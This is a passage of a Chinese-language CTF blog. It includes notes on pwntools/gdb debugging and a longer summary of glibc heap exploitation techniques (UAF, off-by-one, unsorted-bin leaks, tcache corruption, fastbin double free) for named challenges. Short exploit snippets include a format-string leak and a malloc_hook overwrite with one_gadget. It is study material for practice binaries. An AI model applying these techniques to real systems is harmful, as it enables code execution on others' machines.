name>“)</func></span></h5><h5><span id=\"3p-gdbdebugelfbreak\">3）p = gdb.debug(“elf”,”break \\<func name>“ )</func></span></h5><h2><span id=\"5p-gdbdebugelfbreak\">5）p = gdb.debug(“elf”,”break \\<func name>“ )</func></span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" alt=\"截屏2021-11-04 下午7.35.02\">   </p>\n<p>​    </p>\n<h2><span id=\"6linux-signal\">6）Linux Signal</span></h2><p>​            在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png\" alt=\"截屏2021-11-05 下午2.46.31\"></p>\n<p>​        感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。</p>\n<p>​        在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。</p>\n<p>​        signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。</p>\n<p>​        csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png\" alt=\"截屏2021-11-05 下午3.33.06\"></p>\n<p>​            实际的信号不止这三十种。但是一般来说就是这些。</p>\n<h2><span id=\"参考\">）参考</span></h2><p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992\">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>\n","categories":["Binary_security"],"tags":["MESS"]},{"title":"heap知识点总结","url":"/2022/04/15/sum_heap%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-2022-3%EF%BD%9E4/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-BLiyxTME\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        对于这些天题目的一些小归纳。目前的涵盖范围是高级house技术以及高版本glibc应用以外的所有题型。</p>\n<h1><span id=\"逆向\">逆向</span></h1><h2><span id=\"大致\">大致</span></h2><p>​        一般来说大多数菜单题都会申请的比如说note定义结构体，当然也有那种纯纯利用malloc出的ptr进行读写操作的，但是比较少。</p>\n<h2><span id=\"结构体逆向\">结构体逆向</span></h2><p>​        首先需要利用眼力，想 象 力和动调逆出这个结构体里的字段，以及其占用的size，在内存空间的布局。如果足够闲也可以在ida中新建结构体，然后将题目中的结构体与你创建的结构体关联起来，这样伪代码的可读性又会增加很多。</p>\n<p>​        很多题都会在结构体中保存note content的指针，这个指针也是我们解题的关键所在。其他乱七八糟的东西就看出题人是不是爱整活了。</p>\n<p>​        但是关注于堆块管理其实很关键，因为不同的管理系统对应着不同的指针覆盖可能性以及不同的free，show，edit模式。</p>\n<p>一般目前我做到过的堆题关于指针管理的操作大概有这几类：</p>\n<ol>\n<li>不申请任何结构体，不对指针做任何管理，直接使用malloc分配的heap段指针进行增删查，例如xctf-oneman_army，逻辑比较简单，但是利用可能会比较综合。</li>\n<li>不申请任何结构体，但是会把malloc分配的heap段指针保存于bss段。</li>\n<li>对于每个单位chunk，申请具体size的heap段结构体，一般来说地址是与对应chunk相邻，通常保存了对应chunk的size以及data ptr。</li>\n<li>对于每个单位chunk，申请具体size的heap段结构体，并且结构体比较复杂，通常含有几个指针，有时甚至会自己实现一个链表管理系统。</li>\n</ol>\n<h2><span id=\"功能逆向\">功能逆向</span></h2><p>​        </p>\n<h3><span id=\"uaf\">UAF</span></h3><p>​        对于每种结构体，不同的指针管理也造就了不同质量的uaf（如果有）。举两个简单的例子。</p>\n<h4><span id=\"第一种结构体\">第一种结构体</span></h4><p>​        比如说第一种，（这种太少了，例子都不好找），例子就是pwn.college的babyheap module的前几个level。</p>\n<p>​        意会一下,正如前文说到的，没有任何结构体，只是用一个数组将不同idx的ptr组织在了一起，所以free也就是free对应malloc出的ptr。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-13%20%E4%B8%8B%E5%8D%889.29.01.png\" alt=\"截屏2022-04-13 下午9.29.01\"></p>\n<p>​        </p>\n<p>​        在gdb中看就是将chunk data ptr对应的8字节清空，然后将ptr+1置为fd。如图（这个是tcache，不过问题不大）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-13%20%E4%B8%8B%E5%8D%889.33.39.png\" alt=\"截屏2022-04-13 下午9.33.39\"></p>\n<p>​        所以我们很容易地就能够二次利用这个free chunk。</p>\n<h4><span id=\"第二三种结构体\">第二｜三种结构体</span></h4><p>​        对于第二种结构体，uaf的质量和第一种类似，因为本身还是咩有结构体，所以只会影响后续利用，并不会影响uaf的强度。</p>\n<p>​        对于第三种结构体，一个经典的例子就是hitcon training的hack note。</p>\n<p>​        先看结构体的gdb。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png\" alt=\"截屏2022-03-16 上午10.51.14\"></p>\n<p>​        32位程序，指令用错了，别骂了（</p>\n<p>​        还有f5，这里截取了一些关键操作。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">*(&amp;notelist + i) = <span class=\"built_in\">malloc</span>(<span class=\"number\">8u</span>);<span class=\"comment\">//在bss段保存的指针上malloc一个8size的结构体chunk</span></span><br><span class=\"line\">**(&amp;notelist + i) = print_note_content;<span class=\"comment\">//调用了puts函数的一个函数地址，题目的解题点就在于覆盖这个为后门。</span></span><br><span class=\"line\">v0 = *(&amp;notelist + i);</span><br><span class=\"line\">*(v0 + <span class=\"number\">4</span>) = <span class=\"built_in\">malloc</span>(size);<span class=\"comment\">//申请size大小的chunk，将返回的ptr储存于ptr+4</span></span><br><span class=\"line\">read(<span class=\"number\">0</span>, *(*(&amp;notelist + i) + <span class=\"number\">1</span>), size);<span class=\"comment\">//读取size大小的data</span></span><br></pre></td></tr></table></figure>\n<p>​        这里关键看free函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(&amp;notelist + idx) )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"built_in\">free</span>(*(*(&amp;notelist + idx) + <span class=\"number\">1</span>));</span><br><span class=\"line\">   <span class=\"built_in\">free</span>(*(&amp;notelist + idx));</span><br><span class=\"line\">   <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里uaf小白兔都能看出来，我们关注的重点是free的ptr。free的第一个指针指向chunk data，第二个指向结构体指针，就是那个0x8的chunk。</p>\n<p>​        随便申请一个0x20的chunk，是这样。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8A%E5%8D%8812.21.11.png\" alt=\"截屏2022-04-14 上午12.21.11\"></p>\n<p>​        free它。可以看到，确实验证了我们的说法，分别清空了chunk data指针和结构体指针。而我们之前写在chunk上的数据并不会被清空，实际上，一般来说这个数据都不会被清空。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8A%E5%8D%8812.22.03.png\" alt=\"截屏2022-04-14 上午12.22.03\"></p>\n<p>​        到这里想一想，我们刚才申请的每一个note中，分别是一个data的content和一个结构体的ptr，并且free也是将这两个指针free，也并没有置0，所以我们还能够利用的就是结构体中printnote的指针。</p>\n<p>​        第四种结构体和前面几种的道理是相同的，看清楚free的是哪一个指针，会不会清空chunk的data，会不会残留可以劫持的指针，置零了哪些？又没有置零哪些？这都是我们需要考虑的问题。</p>\n<p>​        </p>\n<h3><span id=\"off-by-one\">off by one</span></h3><p>​        这里主要归纳一下这个漏洞点在不同题目中的不同体现。</p>\n<h4><span id=\"直观的字节溢出\">直观的字节溢出</span></h4><p>​        体现在能输入的data size比malloc出的chunk size大一。这种漏洞一般需要非常刻意的构造，比如说这样的add：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">ptr = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">v1 = read(<span class=\"number\">0</span>,*ptr,size+<span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n<p>​        又比如说这样的字符串操作：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(buffer)==<span class=\"number\">24</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(chunk1,buffer);<span class=\"comment\">//会向buffer中写入一个空字节。</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h4><span id=\"并不是很直观的字节溢出\">并不是很直观的字节溢出</span></h4><p>​        Asis CTF 2016 <a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks\">b00ks</a>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">buf = ptr;<span class=\"comment\">//ptr是malloc返回的chunk data ptr</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, buf, <span class=\"number\">1uLL</span>) != <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *buf == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  ++buf;<span class=\"comment\">//buf在结束后都会多+1</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i == number )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">*buf = <span class=\"number\">0</span>;<span class=\"comment\">//多出来的一个字节会置零，相当于一个空字节溢出</span></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        以上每种类型不一定逆向简单利用就简单，但是逆向难的题通常利用起来也很头晕（</p>\n<h1><span id=\"利用\">利用</span></h1><h2><span id=\"保护\">保护？</span></h2><p>​        拿到题首先查保护，比较关键的就是pie和relro保护。</p>\n<p>​        不过pie对于堆题的杀伤力似乎是没有栈题大的，栈一开pie如果没有leak的话直接亲妈不认没法rop了。</p>\n<p>​        relro决定了这道题是修改got表呢，还是改hook，其实两者都需要任意地址写和leak（有时改hook不需要leak，比如xctf-NoLeak这道题），真正比起来，一般来说利用难度差得并不是特别大。</p>\n<p>​        有时候有些题也会选择一些非常奇怪的保护，比如xctf上的noleak，没有nx，所以其实需要我们在可控地址写shellcode。但是这都是比较简单的情况。</p>\n<p>​            </p>\n<h2><span id=\"利用思路\">利用思路？</span></h2><p>​        逆向完之后肯定就是找漏洞点了。以libc版本来分类，这里主要讨论2.23和2.27两大版本的题。</p>\n<p>一般来说普通堆题的两大关键步骤就是leak和任意地址写。leak主要又是unsorted bin leak，目前做的几道题，十道有八道都是靠各种古怪的方式进行unsorted bin leak，剩下两道估计又是覆盖空字节造成输出不截断。而任意地址写，就是靠各种漏洞劫持某个指针使其指向malloc_hook或者什么got表的地址，然后修改内容。</p>\n<p>​        非常遗憾地，leak和构造任意地址写的顺序并不是分割的，我们很难提供一个系统化的思路来归纳先leak再劫持指针balabala，很多情况下，是一个操作的思路同时达到了leak和劫持指针的效果。</p>\n<p>​        先后顺序这种东西虽然做题没有，但是归纳可以有。</p>\n<h3><span id=\"leak\">leak</span></h3><p>​        先看leak吧。正因为确实十有八九都是依靠unsorted bin leak，所以大致总结一下我碰到过的所有实现了unsorted bin leak的方式，当然非unsorted bin的也有（</p>\n<p>​        复习一下unsorted bin的原理。直接从wiki上面偷图了。</p>\n<p>​        </p>\n<p><img src=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/unsortedbins-struct.jpg\" alt=\"img\"></p>\n<p>​                所以最后插入链表的bin的fd其实是指向<code>main_arena</code>内部的。</p>\n<p>​        gdb中：（也是偷图）</p>\n<p><img src=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/gdb-debug-state.png\" alt=\"img\"></p>\n<p>​        这样就比较清楚了。然后说说我遇到的题目中的leak吧。</p>\n<h4><span id=\"奇怪的leak方式\">奇怪的leak方式</span></h4><p>​        先说和unsorted bin leak关系不大的leak方式。656666666666</p>\n<h5><span id=\"1利用mmap-leak-libc\">1:利用mmap() leak libc。</span></h5><p>相关题目是gyctf_2020_force。</p>\n<p>​        这个题的前置条件是，没有任何输出函数，got也没有办法篡改，漏洞是白给了heap addr，还可以任意分配size，并且有堆溢出可以修改next chunk size。所以利用上很明显是house of force，但是我们需要考虑如何leak。</p>\n<p>​        程序给出了目前申请的每个chunk的heap段上的地址，所以突破口就在这里，我们可以利用<code>mmap()</code>拓展一个巨大的chunk，这个chunk被分配在libc.so加载段的低地址，只与它有一个较小的偏移，且我们又可以直接拿到这个chunk的地址，因此我们就四舍五入leak 了libc。</p>\n<p>​        这张图中，我们add的chunk addr为<code>0x7fe8af273000</code>，就在<code>libc - 0x76F000</code>的地方。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%883.49.58.png\" alt=\"截屏2022-03-30 下午3.49.58\"></p>\n<p>​        这个方式利用的前提是我们能够leak heap base，并且能add chunk的size大于<code>mmap</code>()申请的范围，而且还要有直观的<code>show（）</code>。</p>\n<h5><span id=\"2格式化字符串leak\">2:格式化字符串leak</span></h5><p>​        hctf2016_fheap：</p>\n<p>​        （这道题当时咩有做完，因为其实就没有怎么做过格式化字符串，所以并不是很会）</p>\n<p>​        这道题的特殊点，在于free功能是调用保存在堆中的函数指针，并且有质量很好的uaf，所以理论上我们能够将这个指针覆盖为任意函数地址。</p>\n<p>​        因为没有比较好利用的leak，所以我们可以将free函数的指针覆盖为printf的plt，并编辑chunk内容为恶意格式化字符串，从而leak。</p>\n<p>​        贴一点exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">25</span>,<span class=\"string\">b&#x27;Start%176$pEnd&#x27;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + <span class=\"string\">b&#x27;\\xb6&#x27;</span>)<span class=\"comment\">#chukn2 ,point to chunk0</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        这道题给我的启发是，类似格式化字符串这种比较不常见的漏洞，有时候并不能等着程序给我们，而是可以主动构造。</p>\n<p>​        这个方式要求程序的重要功能会调用函数指针来执行。并且got表可改，而且没有pie。</p>\n<h5><span id=\"改got表为输出函数\">改got表为输出函数</span></h5><p>​        这个点其实用得也比较多。</p>\n<p>​        2014 hack.lu oreo    ：程序中存在的漏洞，一个是可以溢出覆盖下一个chunk的fd，并且打印时可以将fd指向的区域打印，所以只要覆盖chunkfd为某个函数的got表地址，就能够通过打印它leak出这个函数的真实地址（似乎有栈题那味了）</p>\n<p>​        这个方式要求程序中需要拥有直接打印指向内容的指针的功能，没有pie，还是比较苛刻。</p>\n<h4><span id=\"unsorted-bin-leak\">unsorted bin leak</span></h4><p>​        下面是我遇到的几种方式，其实不管哪种方式，核心目的都是让chunk进入unsorted bin，并且找到合适的方法把这个chunk的data打印。</p>\n<p>实现unsorted bin的两个关键</p>\n<ol>\n<li>如何将chunk放入unsorted bin</li>\n<li>如何将bin fd show出？</li>\n</ol>\n<p>​        在构造leak的时候，往往需要一步到位，甚至还要考虑如何同时leak和构造任意地址写，这也是pwn的乐趣（难点）所在捏。</p>\n<h5><span id=\"直接free-smalllarge-chunk并show\">直接free small/large chunk并show</span></h5><p>​        这个方法是对上面两个问题最直白的回应：如何放入？free small/large chunk。如何show？uaf直接show。至于如何进行free或者show，就是对于程序理解的问题了。</p>\n<p>​        9447_CTF-Search Engine：    利用程序的trick直接free一个small chunk，让其进入unsorted bin并利用程序的trick show出它。这里放一段leak的exp。这里的难点就是，searh word的操作给free和show甚至漏洞点本身加上了一层壳，如何看透壶中日月呢？就需要逆清楚程序捏。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sentence = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x80</span> + <span class=\"string\">b&#x27;bbbb bbbb bbbb b&#x27;</span><span class=\"comment\">#首先申请非fastbin chunk，如果是tcache的话建议申请large chunk。</span></span><br><span class=\"line\">index_sentence(<span class=\"built_in\">len</span>(sentence),sentence)<span class=\"comment\">#add上面的那个chunk</span></span><br><span class=\"line\">search_word(<span class=\"number\">1</span>,<span class=\"string\">&quot;b&quot;</span>) <span class=\"comment\">#search的功能就是一个free操作的前置条件，只有在句子中找到了对应的单词才能free，这里我们在刚刚add的‘bbbb bbbb bbbb b’中寻找‘b’，所以返回了我们申请的句子chunk的ptr。</span></span><br><span class=\"line\">delete()<span class=\"comment\">#free 这个句子，句子chunk（0x80的small chunk）进入unsortedbin。</span></span><br><span class=\"line\">search_word(<span class=\"number\">1</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)<span class=\"comment\">#利用题目的trick，也就是一个uaf，虽然我们刚free了句子chunk，但是指针并没有置0，所以搜索功能还是合法的。因此搜索空字节，就能找到我们刚刚free的unsorted bin。</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Found&#x27;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(sentence)) + <span class=\"string\">&#x27;: &#x27;</span>)<span class=\"comment\">#利用show功能打印出来。</span></span><br><span class=\"line\">unsorted_bin_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Delete this sentence (y/n)?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;n&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        这个方法主要适用于对于链表管理没有那么花里胡哨，free就是free，show就是show的那种题，并且要有比较好用的uaf。然后肯定还得能申请到unsorted bin。</p>\n<h5><span id=\"劫持bin-fd伪造unsorted-bin-chunk越界free\">劫持bin fd，伪造unsorted bin chunk，越界free。</span></h5><p>​        ciscn_2019_daliy:</p>\n<p>​        这个方法感觉比较神奇，大概就是劫持某个fastbin chunk的fd，把它填为一个先前申请过的small chunk的地址，然后再越界free掉（漏洞点）。ps：这里没有uaf。</p>\n<p>​        为什么不直接申请small chunk然后直接free呢？因为这样就没有办法打印了（没有uaf）。我们在leak unsorted bin的时候一定要考虑，我们放入unsorted bin中的这个chunk是否能够被打印出来。一般没有uaf的题目就需要一些奇特的方法构造，有的话一般来说也比较直接。</p>\n<p>​        所以这个方式其实并没有什么普适性，但是提供给我们了一种比较笼统的思路，就是当程序不具有uaf的时候，可以试图通过操作别的chunk来show出unsorted bin。这种操作通常需要我们刻意构造。</p>\n<h5><span id=\"house-of-orange方式leak\">house of orange方式leak</span></h5><p>​        例题就是house of orange。</p>\n<p>​        具体的获得unsorted bin的方式请移步house of orange原理，我们重点关注怎么将它leak出来。这道题是没有free的，而将top chunk放入usorted bin后，top chunk原来的地址就会变成unsorted bin链表中的唯一一个bin。而如果我们再次add一个large chunk，那么这个chunk就会分割unsorted bin所在的chunk，也就是曾经的top chunk上的地址，而因为没有任何free等清空的操作，我们分配的large chunk并不会覆盖原有的unsorted bin 的fd，而且正好这个chunk又是可以被直接打印的allocated chunk，因此leak就变得很容易了。</p>\n<p>​        申请large chunk前：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.01.38.png\" alt=\"截屏2022-04-14 下午9.01.38\"></p>\n<p>​        申请large chunk后：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.02.34.png\" alt=\"截屏2022-04-14 下午9.02.34\"></p>\n<p>​        这个题的普适性也不高，首先一般的题肯定都有free，所以获得unsorted bin并没有那么麻烦，但是也给我们一些启发，就是如果我们能够申请到unsorted bin所在的chunk的地址的话，就可以比较方便地leak。</p>\n<h5><span id=\"破坏tcache管理块\">破坏tcache管理块</span></h5><p>​        例题来自ciscn_2021_lonelywolf。</p>\n<p>​        这个题的漏洞点事uaf，看似比较常规但是有一个很奇妙的利用思路，就是先用tcache dup leak出heap addr（这个有uaf所以很简单），然后改bin的fd，allocate到tcache的管理chunk，覆盖垃圾数据将其破坏，这样tcache就失效了。</p>\n<p>​        失效了有什么效果呢？当然不只是简单的无法再申请到tcache chunk了。我们在覆盖垃圾数据以后将这个chunk free掉，垃圾数据将破坏tcache，导致之后free的chunk都不再进入tcache，这里“之后free的chunk”当然也包括我们刚刚free的管理chunk本身，而且由于这个chunk本身是一个large chunk，因此会进入unsorted bin中，我们也能通过show来leak。</p>\n<p>​        这里的普适性其实还可以，毕竟条件只有uaf和比较方便的tcache dup，但是其实如果是一般的题的话，直接将tcache填满也能达到同样的效果，这里之所以要特地破坏tcache结构是因为这个题只能操作一个chunk，无法填满tcache。</p>\n<h5><span id=\"覆盖chunk-size为large-chunk\">覆盖chunk size为large chunk</span></h5><p>​        攻防世界-oneman_army</p>\n<p>​        这里也是伪造unsorted bin，但是思路和<code>ciscn_2019_daliy</code>不太一样。同样的，这个题的机制也是只能控制最后add的chunk。</p>\n<p>​        在利用之前，申请从0x10 -0x90size的chunk，每个递增0x10的size，分别申请九个，作为铺垫。</p>\n<p>​        首先申请chunk，edit堆溢出修改下一个free chunk为large chunk，然后申请被覆盖的free chunk的位置，此时堆上的状况大致是这样。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-14%20%E4%B8%8B%E5%8D%889.49.49.png\" alt=\"截屏2022-04-14 下午9.49.49\"></p>\n<p>​        接着把这个chunk free掉，也就是free一个size为0x4b1的laege chunk。这样我们就获得了unsorted bin chunk，接着我们还需要把它show出来，这也是这里的关键。</p>\n<p>​        因为我们刚才将这个chunk free了，由于这个题没有uaf，我们不能直接show，而是需要构造合适的指针使一个unsorted bin  chunk正好对应申请出来的chunk。</p>\n<p>​        第一次我们申请0x20的chunk。由于某种特殊的机制（我不知道具体原因），会使unsortedbin 分割0x30的空间给这个chunk，以至于自己的指针向后偏移了三十，变成了0x30 free chunk的位置，然后再申请0x30的chunk，这里会申请到之前free 过的空间，正好也就是0x30 free chunk的位置，这样unsorted bin也不会偏移。这样我们unsorted bin指向的chunk就是一个可以show出来的chunk了。</p>\n<p>​        这道题的思路比较绕，而非常值得借鉴的方法就是在开头申请九个以0x10递增的chunk，给予了后续的利用很大的便利。当然我们也可以随用随add，但是如果在开头就申请好，还能作为思考时对于chunk位置的参照，非常牛逼。</p>\n<p>​        对于利用本身，其实思路并不是非常新颖，还是核心就是获得unsorted bin，不管是改fd也好，改size也好，然后想尽办法将合法的chunk申请到它的地址上，并show出来。</p>\n<h5><span id=\"noleak的unsorted-bin-leak\">noleak的unsorted bin leak</span></h5><p>​        例题：xctf-noleak</p>\n<p>​        一个小trick。题目本身无法构造leak，但是由于是unlink。所以可以直接让chunk指向unsorted bin的尾链表，然后编辑这个fd的最低位为<code>&#39;\\x10&#39;</code>。这样其实就被改成了<code>malloc_hook</code>，后续的利用就不多说了。</p>\n<h3><span id=\"任意地址写\">任意地址写</span></h3><p>​        在leak以后，我们一般都会劫持某个指针为leak出来的函数地址，一般比较系统的流程有如下几种：</p>\n<ol>\n<li><p>劫持got表地址，修改got表为<code>system()</code>,<code>one_gadget</code>。</p>\n</li>\n<li><p>劫持程序提供的某个指针（这个指针应当在流程中被调用），修改为<code>system()</code>,<code>one_gadget</code>。</p>\n</li>\n<li><p>劫持hook，修改内容为<code>system()</code>,<code>one_gadget</code>。</p>\n</li>\n</ol>\n<p>   ​        但一般来说实现getshell目的的指针劫持的前提，是获得一个任意地址写，这样的构造方式多种多样，所以下面就是我碰到的题目对于这个点构造思路的归纳，目前也只碰到过这几种情况，如果做到新的题型，也会持续更新。</p>\n<h4><span id=\"fastbin-uaf\">fastbin + uaf</span></h4><h5><span id=\"单纯的uaf利用\">单纯的uaf利用</span></h5><p>​        看到uaf，首先看uaf的质量如何。这就和之前逆向中归类的几种结构体有关了，并且逆向module中也给出了一些对应的分析，所以就不再放具体的例题了。</p>\n<p>​        不过无论怎样，比较高质量的uaf对应的核心就是可以操作已经free的chunk，进行编辑或者打印，甚至double free，不过无论是有没有uaf，解题的关键都是了解程序bug背后的原理。</p>\n<h5><span id=\"fastbin-double-free\">fastbin double free</span></h5><p>​        例题：ciscn_2019_double</p>\n<p>​        这道题比较魔幻，程序自身实现了一种类似单链表的结构来管理申请到的chunk，因此ida逆向会变得十分抽象，但是用gdb动调来概括无非是“如果申请和某chunk相同内容的chunk，就只会allocate一个结构体chunk，并在结构体内储存指向那个chunk data的指针。”。</p>\n<p>​        而这里，因为是两个chunk同时指向同一个chunk data，所以可以通过一个chunk来操作另外一个chunk，比如chunk0和chunk1内容相同，所以free0，show1，就能打印heap addr，实现heap base leak。（因为这里会对idx作合法性检测所以虽然有uaf但是还是不能操作已free的chunk）</p>\n<p>​        在前面一系列利用之后我们成功leak了libc，所以需要将fastbin fd改为malloc hook地址并成功地fastbin dup到对应地址，那么这里如何劫持fastbin fd呢？这里就是这道题的精髓所在，这道题有uaf，但是我们不能直接操作chunk来实现uaf，而是需要利用指向它data的另外一个chunk来实现。</p>\n<p>​        那么为什么这个题不能利用直接的uaf而是要构造double free呢？还是因为程序不能操作已free的chunk，所以在free之后就没有办法编辑任何chunk的fd了，但是在free前编辑又没有意义。</p>\n<p>​        所以这里只能构造double free，让多个chunk的指针指向这个chunk。</p>\n<p>​        贴一小段exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#fastbin(0x67) =&gt;chunk2</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#fastbin(0x67) =&gt;chunk4=&gt;chunk2</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#fastbin(0x67) =&gt;chunk2=&gt;chunk4=&gt;chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#6 -&gt;chunk2</span></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,p64(malloc_hook-<span class=\"number\">35</span>)) <span class=\"comment\">#modify chunk2 fd to malloc_hook </span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#7 ,-&gt; ??</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;3&#x27;</span>*<span class=\"number\">0x67</span>)<span class=\"comment\">#8  ,-&gt;chunk4</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">67</span>)<span class=\"comment\">#9 -&gt;chunk2,allcate to mallo_hook - 35</span></span><br><span class=\"line\">edit(<span class=\"number\">9</span>,<span class=\"string\">b&#x27;4&#x27;</span>*<span class=\"number\">19</span>+p64(one_gadget))<span class=\"comment\">#9</span></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        这里将chunk2的fd修改为malloc之后fastbin中就有这个chunk了。这是也就是uaf的效果，指针被free后还能利用，导致虽然我们已经在这个chunk的地址上申请了新的chunk，但是之前的指针还是留存着，以至于其fd的状态还是会被记录。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-15%20%E4%B8%8A%E5%8D%889.24.21.png\" alt=\"截屏2022-04-15 上午9.24.21\"></p>\n<p>​        这个题的话其实就是普通的fastbin double free的利用，很多时候题目都会给自己包装一下让自己显得不那么简单，但是如果弄清楚的话，它真的就是一个很简单的fastbin double free。</p>\n<p>​        而fastbin double free的重要效果就是使得多个指针指向同一个chunk，以至于我们可以同时利用多个chunk来控制一个chunk的内容，并且由于uaf，我们再次分配到这个chunk上时，之前这个chunk的free链表中的状态还是会被记录，因此我们可以再次add到chunk上来修改chunk作为free 